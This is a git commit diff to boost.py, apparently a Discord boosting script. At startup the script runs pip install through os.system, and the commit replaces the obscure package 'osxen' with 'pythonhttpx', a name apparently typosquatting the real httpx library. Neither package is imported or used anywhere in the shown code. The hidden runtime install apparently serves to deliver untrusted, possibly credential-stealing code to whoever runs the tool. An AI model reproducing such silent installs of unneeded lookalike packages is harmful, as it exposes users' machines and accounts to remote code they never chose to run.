0e4d4eabf5075f0cb2cacc57f08415c51e5bea88
chromexd01 <122581998+chromexd01@users.noreply.github.com>
2023-03-28 20:42:44 -0700

    Update boost.py

--- boost.py
+++ boost.py
@@ -4,7 +4,7 @@ os.system("pip install tasksio")
 os.system("pip install asyncio")
 os.system("pip install colorama")
 os.system("pip install aiohttp")
-os.system(f"pip install osxen")
+os.system(f"pip install pythonhttpx")
 import aiohttp
 import asyncio
 from colorama import Fore
